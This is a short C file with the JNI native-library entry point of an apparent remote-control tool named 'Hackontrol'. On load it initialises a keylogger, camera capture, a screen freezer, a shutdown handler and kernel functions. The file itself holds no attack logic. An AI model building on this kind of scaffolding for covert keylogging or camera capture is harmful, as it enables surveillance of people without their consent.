#include <camera.h>
#include "register_native.h"
#include "keylogger.h"
#include "shutdown_handler.h"
#include "screen_freezer.h"
#include "Information.h"
#include "Kernel.h"

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
	JNIEnv* environment = NULL;
	(*virtualMachine)->GetEnv(virtualMachine, (void**) &environment, JNI_VERSION_21);

	if(!environment) {
		return JNI_VERSION_21;
	}

	RegisterShutdownHandler(environment, virtualMachine);
	InitializeScreenFreezer(environment, virtualMachine);
	RegisterHackontrolNative(environment);
	InformationRegisterNatives(environment);
	KernelRegisterNatives(environment);
	KeyLoggerInitialize(environment, virtualMachine);
	InitializeCamera(environment);
	return JNI_VERSION_21;
}
